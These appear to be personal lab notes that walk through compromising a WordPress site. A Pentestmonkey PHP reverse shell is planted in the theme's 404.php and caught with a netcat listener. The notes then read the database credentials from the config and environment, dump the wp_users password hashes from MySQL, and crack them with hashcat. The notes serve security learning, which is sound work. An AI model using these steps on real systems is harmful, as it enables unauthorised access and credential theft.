Always use HTTPS even in an internal environment

Weak password hasing is one of the multiple cryptographic failures
Once connected to the wordpress admin page > Tools > Theme File Editor > We select a theme to edit.(Twenty Twenty-One, install from 'Themes' if not available)
Once it is done we look for the 404.php theme file.
On the host system we use the tool '' and we give the kali host ip address and the port to attack. We set our host listening for a connection:
$nc -nvlp 8000
The connection is going to be initiated by the 404.php page that we are going to modify by adding php code generate by HackTools, precising our ip and port to connect using the Pentestmonkey's reverse shell
To do so we download the HackTools web extension
Once we referred our ip and port we copy paste the php code in the 404.php template and get rid off the <?php and ?> added by our code before saving
Then Appearence > Theme > Twenty twenty one > Activate
If we go back to our website and try to visit a page that doesn't exit we get a reverse shell
We can go into var/www/html to access the config w⁻config.php and get db password

Then we try to connect to mysql
By reading the conf file we get :
define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') ); same define line for username dans db host
Meaning the password, the username, the db host name are environement variables. To access those value :
$env
Thanks to this data we are trying to display database info
$mysql	trying this command returns an error
Knowing the username and host name we provide them
$mysql -u wordpress -h db -p	-p is used to prompt password
Once connected we are not going to get data output until the exit, so we have ta connect each time we get what we want to continu looking into our database.
First row:
show databases;
exit;

Second row:
use wordpress;
show tables;
exit;

Third row:
use wordpress;
select * from wp_users;
exit;
We get password hash for will account we previously created
We put the hash into a file and use hascat
$hashcat --help |grep -i php	to get hash type 400 (phpass)
Can determine hash type on hashes.com, phpass returned
$hascat -a 0 -m 400 will.hash ~/Scripts/SecLists/Passwords/COmmon-Credentials/best1050.txt -a 0 means brute force (dictionary attack)



